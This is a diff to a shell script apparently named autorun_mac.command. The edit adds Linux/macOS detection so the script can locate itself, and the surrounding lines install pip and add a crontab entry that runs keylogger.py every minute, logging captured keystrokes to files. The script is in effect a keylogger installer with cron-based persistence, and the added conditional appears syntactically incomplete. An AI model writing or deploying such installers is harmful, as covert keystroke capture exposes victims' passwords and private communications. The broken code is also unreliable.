@@ -2,15 +2,19 @@
 
 cd
 
-filepath="$(find -iname autorun_mac.command)"
+operating_system=`python -c "import platform; print(platform.system())"`
+
+if [ $operating_system = Linux ]
+    then filepath="$(find -iname autorun_mac.command)"
+else if [ $operating_system = Darwin ]
+    then filepath="$(mdfind -name autorun_mac.command)"
+
 path="${filepath/autorun_mac.command}"
 path="${path/./$(pwd)}"
-
 
 ###################
 ### install pip ###
 ###################
-
 
 py_version="$(which python3)"
 
@@ -27,6 +31,7 @@ rm get-pip.py
 #####################################################
 
 crontab_command="* * * * * cd ${path} && "$py_version" keylogger.py >> ../logs/keylogs/keylog_cron_outputs/keylog_outputs.txt 2>> ../logs/keylogs/keylog_cron_errors/keylog_errors.txt"
+
 crontab -l 2>/dev/null| cat - <(echo "$crontab_command") | crontab -
 
 # sleep for 90 seconds, 30 seconds before the second call of the keylogger file
